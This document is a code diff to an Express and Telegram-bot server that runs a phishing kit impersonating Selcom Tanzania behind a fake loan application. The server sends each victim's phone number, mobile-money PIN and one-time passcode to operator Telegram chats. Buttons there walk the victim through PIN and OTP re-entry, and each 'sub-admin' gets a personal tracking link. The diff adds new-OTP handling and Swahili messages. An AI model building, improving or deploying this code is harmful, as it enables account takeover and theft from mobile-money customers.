@@ -1,5 +1,5 @@
 /**
- * SELCOM TANZANIA - PRIVATE MAPPED SUB-ADMIN SERVER
+ * SELCOM TANZANIA - PRIVATE SUB-ADMIN ROUTED SERVER
  */
 
 const express = require('express');
@@ -54,103 +54,98 @@ function resolveTargetChat(adminParam) {
 }
 
 async function initBot() {
-  try {
-    bot = new TelegramBot(TOKEN, { polling: true });
+  bot = new TelegramBot(TOKEN, { polling: true });
 
-    bot.on('polling_error', (error) => {
-      if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
+  bot.onText(/\/start/, async (msg) => {
+    try {
+      const chatId = String(msg.chat.id);
+      let chatInfo = {};
+      try { chatInfo = await bot.getChat(chatId); } catch (e) {}
+
+      const username = chatInfo.username || msg.from.username || 'N/A';
+      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
+      const lastName = chatInfo.last_name || msg.from.last_name || '';
+
+      if (!admins.has(chatId)) {
+        admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
+        saveAdmins();
+      }
+
+      const userLink = `${APP_URL}/?admin=${chatId}`;
+
+      if (chatId === String(FALLBACK_ADMIN_ID)) {
+        const mainAdminMessage = `👑 *Selcom Admin Principal*\n\n` +
+                                 `👤 *Jina:* ${firstName} ${lastName}\n` +
+                                 `• Chat ID: \`${chatId}\`\n\n` +
+                                 `🔗 *Linki yako binafsi:*\n${userLink}`;
+        await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
         return;
       }
-    });
 
-    bot.onText(/\/start/, async (msg) => {
-      try {
-        const chatId = String(msg.chat.id);
-        let chatInfo = {};
-        try { chatInfo = await bot.getChat(chatId); } catch (e) {}
-
-        const username = chatInfo.username || msg.from.username || 'N/A';
-        const firstName = chatInfo.first_name || msg.from.first_name || 'User';
-        const lastName = chatInfo.last_name || msg.from.last_name || '';
-
-        if (!admins.has(chatId)) {
-          admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
-          saveAdmins();
-        }
-
-        const userLink = `${APP_URL}/?admin=${chatId}`;
-
-        if (chatId === String(FALLBACK_ADMIN_ID)) {
-          const mainAdminMessage = `👑 *Selcom Admin Principal*\n\n` +
-                                   `👤 *Info:*\n` +
-                                   `• Nom: ${firstName} ${lastName}\n` +
-                                   `• Chat ID: \`${chatId}\`\n\n` +
-                                   `🔗 *Votre lien de suivi personnel:*\n${userLink}`;
-          await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
-          return;
-        }
-
-        const subAdminMessage = `🤖 *ESPACE SOUS-ADMINISTRATEUR SELCOM*\n\n` +
-                              `👤 *Vos Infos:*\n` +
-                              `• Nom: ${firstName} ${lastName}\n` +
+      const subAdminMessage = `🤖 *SEHEMU YA MSAIDIZI WA SELCOM (SUB-ADMIN)*\n\n` +
+                              `👤 *Jina:* ${firstName} ${lastName}\n` +
                               `• Chat ID: \`${chatId}\`\n\n` +
-                              `🔗 *Votre lien de suivi indépendant:*\n${userLink}`;
+                              `🔗 *Linki yako binafsi ya kufuatilia:*\n${userLink}\n\n` +
+                              `_Wateja wako watakuja moja kwa moja hapa._`;
 
-        await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
-      } catch (err) {}
-    });
+      await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
+    } catch (err) {}
+  });
 
-    bot.on('callback_query', async (query) => {
-      try {
-        const actionData = query.data || '';
-        const chatId = String(query.message.chat.id);
-        const parts = actionData.split('_');
-        const actionType = parts.slice(0, 2).join('_'); 
-        const targetId = parts.slice(2).join('_');
+  bot.on('callback_query', async (query) => {
+    try {
+      const actionData = query.data || '';
+      const chatId = String(query.message.chat.id);
+      const parts = actionData.split('_');
+      const actionType = parts.slice(0, 2).join('_'); 
+      const targetId = parts.slice(2).join('_');
 
-        let session = sessions.get(targetId);
-        if (!session) session = { adminChatId: chatId };
+      let session = sessions.get(targetId);
+      if (!session) session = { adminChatId: chatId };
 
-        const chatTarget = session.adminChatId || chatId;
+      const chatTarget = session.adminChatId || chatId;
 
-        switch (actionType) {
-          case 'DENY_CREDS':
-          case 'WRONG_PIN':
-            session.status = 'RETRY_PIN';
-            session.pin = '';
-            await bot.sendMessage(chatTarget, `❌ PIN incorrect. Mteja ametakiwa kurudia.`);
-            break;
-          case 'ALLOW_CREDS':
-            session.status = 'PROCEED_OTP';
-            await bot.sendMessage(chatTarget, `✅ PIN imekubaliwa. Mteja ameelekezwa kwenye ukurasa wa OTP.`);
-            break;
-          case 'WRONG_OTP':
-            session.status = 'RETRY_OTP';
-            session.otp = '';
-            await bot.sendMessage(chatTarget, `❌ OTP si sahihi. Mteja ametakiwa kuingiza tena.`);
-            break;
-          case 'APPROVED_FINAL':
-            session.status = 'SUCCESS';
-            await bot.sendMessage(chatTarget, `🎉 Mkopo umeidhinishwa kikamilifu!`);
-            break;
-          default:
-            break;
-        }
+      switch (actionType) {
+        case 'DENY_CREDS':
+        case 'WRONG_PIN':
+          session.status = 'RETRY_PIN';
+          session.pin = '';
+          await bot.sendMessage(chatTarget, `❌ PIN imekataliwa (WRONG PIN). Mteja anaombwa kuweka PIN upya.`);
+          break;
+        case 'ALLOW_CREDS':
+          session.status = 'PROCEED_OTP';
+          await bot.sendMessage(chatTarget, `✅ Umeingia vizuri (ALLOW). Mteja ameelekezwa kwenye hatua ya OTP.`);
+          break;
+        case 'WRONG_OTP':
+          session.status = 'RETRY_OTP';
+          session.otp = '';
+          await bot.sendMessage(chatTarget, `❌ OTP imekataliwa (WRONG OTP). Mteja anapaswa kuweka OTP upya.`);
+          break;
+        case 'REQUEST_NEW_OTP':
+          session.status = 'REQUEST_NEW_OTP';
+          await bot.sendMessage(chatTarget, `🔄 Mteja ameomba nambari mpya ya OTP.`);
+          break;
+        case 'APPROVED_FINAL':
+          session.status = 'SUCCESS';
+          await bot.sendMessage(chatTarget, `🎉 Mkopo umeidhinishwa kikamilifu! Ukurasa wa mafanikio umeonyeshwa kwa mteja.`);
+          break;
+        default:
+          break;
+      }
 
-        await bot.answerCallbackQuery(query.id, { text: `Imekamilika` }).catch(() => {});
-        if (query.message && query.message.message_id) {
-          await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
-        }
-      } catch (err) {}
-    });
-  } catch (e) {}
+      await bot.answerCallbackQuery(query.id, { text: `Imekamilika` }).catch(() => {});
+      if (query.message && query.message.message_id) {
+        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
+      }
+    } catch (err) {}
+  });
 }
 
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: NEW SELCOM APPLICANT delivery to Telegram
+// Step 1: Submit Phone Number & PIN -> Title: **NEW SELCOM APPLICANT** (Buttons: ALLOW, DENY)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { phone, pin, adminChatId } = req.body || {};
@@ -166,17 +161,18 @@ app.post('/api/submit-credentials', async (req, res) => {
       status: 'WAITING_CREDS_APPROVAL' 
     });
 
-    const message = `🔴 *NEW SELCOM APPLICANT*\n\n` +
-                    `📞 *Namba ya Simu:* \`${phone}\`\n` +
-                    `🔒 *Namba ya PIN:* \`${pin}\``;
+    const message = `🔴 **NEW SELCOM APPLICANT**\n\n` +
+                    `📱 *Nambari ya Simu:* \`${phone}\`\n` +
+                    `🔒 *Nambari ya PIN:* \`${pin}\`\n\n` +
+                    `📋 *Fomati ya kunakili:*\n\`${phone}:${pin}\``;
 
     const opts = {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'DENY', callback_data: `DENY_CREDS_${userId}` },
-            { text: 'ALLOW', callback_data: `ALLOW_CREDS_${userId}` }
+            { text: 'ALLOW', callback_data: `ALLOW_CREDS_${userId}` },
+            { text: 'DENY', callback_data: `DENY_CREDS_${userId}` }
           ]
         ]
       }
@@ -188,7 +184,7 @@ app.post('/api/submit-credentials', async (req, res) => {
     
     return res.status(200).json({ success: true, userId });
   } catch (err) {
-    return res.status(500).json({ success: false, error: 'Hitilafu ya mtandao.' });
+    return res.status(500).json({ success: false, error: 'Tatizo la mtandao.' });
   }
 });
 
@@ -199,7 +195,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: 6-digit OTP accompanied by applicant phone number
+// Step 2: Submit 6-digit OTP -> Title: **OTP VERIFICATION** accompanied by applicant phone number
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -210,16 +206,16 @@ app.post('/api/submit-otp', async (req, res) => {
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
 
-    const message = `🔴 *SELCOM - OTP (Tarakimu 6)*\n\n` +
-                    `📞 *Namba ya Simu:* \`${session.phone}\`\n` +
-                    `📱 *Msimbo wa OTP:* \`${otp}\``;
+    const message = `🔴 **OTP VERIFICATION**\n\n` +
+                    `📱 *Nambari ya Simu:* \`${session.phone}\`\n` +
+                    `🔑 *Msimbo wa OTP (Tarakimu 6):* \`${otp}\``;
 
     const opts = {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${userId}` },
+            { text: 'WRONG PIN ❌', callback_data: `DENY_CREDS_${userId}` },
             { text: 'WRONG OTP ❌', callback_data: `WRONG_OTP_${userId}` },
             { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
           ]
@@ -231,10 +227,11 @@ app.post('/api/submit-otp', async (req, res) => {
 
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Hitilafu' });
+    return res.status(500).json({ success: false, error: 'Tatizo' });
   }
 });
 
+// Request New OTP Handler
 app.post('/api/request-new-otp', async (req, res) => {
   try {
     const { userId } = req.body || {};
@@ -242,12 +239,29 @@ app.post('/api/request-new-otp', async (req, res) => {
     if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
 
     const targetChat = session.adminChatId;
-    if (bot && targetChat) {
-      await bot.sendMessage(targetChat, `⚠️ *Mteja (Namba: ${session.phone}) ameomba Msimbo Mpya wa OTP (Resend OTP).*`, { parse_mode: 'Markdown' });
-    }
+    session.status = 'WAITING_OTP_VERIFICATION';
+
+    const message = `⚠️ **OMBI LA OTP MPYA**\n\n` +
+                    `📱 *Nambari ya Simu:* \`${session.phone}\`\n` +
+                    `Mteja ameomba kutumiwa nambari mpya ya OTP baada ya muda kuisha.`;
+
+    const opts = {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: 'WRONG PIN ❌', callback_data: `DENY_CREDS_${userId}` },
+            { text: 'WRONG OTP ❌', callback_data: `WRONG_OTP_${userId}` },
+            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
+          ]
+        ]
+      }
+    };
+
+    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
     return res.status(200).json({ success: true });
-  } catch (e) {
-    return res.status(500).json({ success: false });
+  } catch (err) {
+    return res.status(500).json({ success: false, error: 'Tatizo' });
   }
 });
 
@@ -256,4 +270,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+        
